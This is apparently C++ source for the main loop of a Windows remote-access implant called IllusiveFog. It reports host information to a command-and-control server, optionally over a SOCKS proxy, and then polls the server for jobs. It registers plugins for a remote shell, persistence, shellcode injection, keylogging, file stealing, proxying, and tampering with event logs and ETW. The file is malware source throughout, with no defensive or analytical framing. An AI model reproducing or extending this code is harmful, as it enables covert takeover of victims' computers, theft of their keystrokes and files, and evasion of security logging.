
#include "common.h"
bool Activate_IllusiveFog = false;

int   WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);//marker
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL); //marker

	IllusiveFog::MemoryManager Agent_MemoryManager;

#ifdef SOCKS
	IllusiveFog::IllusiveFog IllusiveFog_agent(sock_ip, sockport, dest_ip, destport, socks_timer, socks_auth_user, socks_auth_pass, auth_enabled);
#else
	IllusiveFog::IllusiveFog IllusiveFog_agent(NULL, 0, dest_ip, destport, socks_timer, NULL, NULL, FALSE);
#endif

	IllusiveFog::IllusiveFog::IllusiveFog_result IllusiveFog_agent_result;
	PAgent_Info agent_info = IllusiveFog_agent.GetAgentInfo();
	char* temp = (char*)Agent_MemoryManager.AllocateTemporary(strlen(agent_info_location) + strlen(intial_param1) + strlen(inital_param2) + strlen(inital_param3) + strlen(initial_param4) + strlen(initial_param5) + post_request_extra_space);
	char* post_request = (char*)Agent_MemoryManager.AllocateTemporary(default_intial_post_request_size + get_request_extra_space + 1);
	ZeroMemory(post_request, default_intial_post_request_size + get_request_extra_space + 1);
	IllusiveFog_agent_result = IllusiveFog_agent.send_IllusiveFog_agent_info(agent_info, intial_param1, inital_param2, inital_param3, initial_param4, initial_param5, agent_info_location, temp, post_request);
	PAgentSession_info agent_session_info = IllusiveFog_agent.SetAgentSession_info(post_request);
	ZeroMemory(post_request, default_intial_post_request_size + 1);
	Agent_MemoryManager.FreeTemporary(post_request);
	Agent_MemoryManager.FreeTemporary(temp);
	IllusiveFog_agent_result = IllusiveFog_agent.form_agent_session(agent_session_info, agent_info, IllusiveFog_agent_get_request, IllusiveFog_agent_post_request, IllusiveFog_agent_plugin_request, IllusiveFog_agent_error_code_request);
	IllusiveFog_agent.form_plugins(ShellPlugin,
		PersistPlugin,
		SelfSocks,
		InjShellCo,
		LoadPlugin,
		EVTXPlugin,
		ETWPlugin,
		VerbosePlugin,
		VerboseCounter,
		CleanupPlugin,
		KeyLogPlugin,
		FileStealerPlugin);
	IllusiveFog_agent.IllusiveFog_form_hexcommands(hex_command_shell,
		hex_command_persistence,
		hex_command_injshell,
		hex_command_selfsocks,
		hex_command_load,
		hex_command_evtx,
		hex_command_etw,
		hex_command_verbose,
		hex_command_cleanup,
		hex_command_unload,
		hex_command_keylog,
		hex_command_file_stealer);
	IllusiveFog_agent.IllusiveFog_set_reporter_param(reporter_param1, reporter_param2, reporter_param3, reporter_error_code_param);
	IllusiveFog_agent.IllusiveFog_set_ecpath(reporter_error_code_param, dest_ip); //clean this up remove dest_ip and use it from agent_reporter
	Agent_MemoryManager.FreeAgentInfo(agent_info);
	Agent_MemoryManager.FreeAgentSessionInfo(agent_session_info);
	agent_session_info = NULL;
	agent_info = NULL;
	post_request = NULL;
	temp = NULL;
	delete(agent_session_info);
	delete(agent_info);
	delete(post_request);
	delete(temp);

	Activate_IllusiveFog = true;
	DWORD get_size = get_request_extra_space + strlen(IllusiveFog_agent_get_request) * sizeof(char);
	char* get_jobs_buffer = new char[get_content_length_buffer_size + get_size + 1];
	char jobs_buffer[get_content_length_request_size + 1];
	ZeroMemory(jobs_buffer, get_content_length_request_size + 1);
	PJobs jobs;
	__try {
		while (Activate_IllusiveFog) {
			IllusiveFog_agent.IllusiveFog_check_plugin_status();
			ZeroMemory(get_jobs_buffer, get_content_length_buffer_size + get_size);
			ZeroMemory(jobs_buffer, get_content_length_request_size + 1);
			IllusiveFog_agent_result = IllusiveFog_agent.IllusiveFog_receive_jobs(get_jobs_buffer, jobs_buffer, get_size);
			ZeroMemory(jobs_buffer, get_content_length_request_size + 1);
			ZeroMemory(get_jobs_buffer, get_content_length_buffer_size + get_size);
			if (IllusiveFog_agent_result == IllusiveFog_agent.IllusiveFog_s_ok) {
				jobs = IllusiveFog_agent.IllusiveFog_form_jobs();
				if (jobs != NULL) {
					ZeroMemory(jobs_buffer, get_content_length_request_size + 1);
					ZeroMemory(get_jobs_buffer, get_content_length_buffer_size + get_request_extra_space);

					IllusiveFog_agent_result = IllusiveFog_agent.IllusiveFog_load_plugin(jobs, jobs_buffer, get_jobs_buffer, NULL);

					if (IllusiveFog_agent_result == IllusiveFog_agent.IllusiveFog_s_ok || IllusiveFog_agent_result == IllusiveFog_agent.IllusiveFog_error_plugin_already_loaded) {
						IllusiveFog_agent.IllusiveFog_invoke_plugin(jobs);

					}
					else {
						Agent_MemoryManager.FreeJobs(jobs);
						jobs = NULL;
					}
				}
				else continue;
			}
			else continue;

		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

		IllusiveFog_agent.IllusiveFog_report_ec_test(IllusiveFog_agent.IllusiveFog_agent_crashed);

	}


}
